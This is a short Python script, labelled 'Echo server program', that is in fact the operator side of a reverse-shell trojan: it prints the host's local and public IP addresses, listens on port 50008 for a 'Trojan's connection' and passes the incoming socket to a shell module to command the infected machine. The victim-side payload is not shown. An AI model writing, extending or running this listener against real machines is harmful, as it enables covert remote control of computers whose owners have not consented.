# Echo server program
import socket
from tools import *

import shell
import myip

def run_trojan_server(host, port):
    localip  = myip.myip_lan()
    globalip = myip.myip_wan()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port,))
        s.listen(1)
        while True:
            print('My local IP: ', localip)
            print('My global IP:', globalip)
            print('Waiting for Trojan\'s connection...')
            conn, addr = s.accept()
            print('Connected by', addr)
            with conn:
                try:
                    shell.terminal(conn)
                except Exception as e:
                    print('Exception:', e)
            print('disconnected!')
            retval = input('exit shell? (y/N) ')
            if retval.lower().startswith('y'):
                print('See you ^_^')
                break

if __name__ == '__main__':
    run_trojan_server('', 50008)
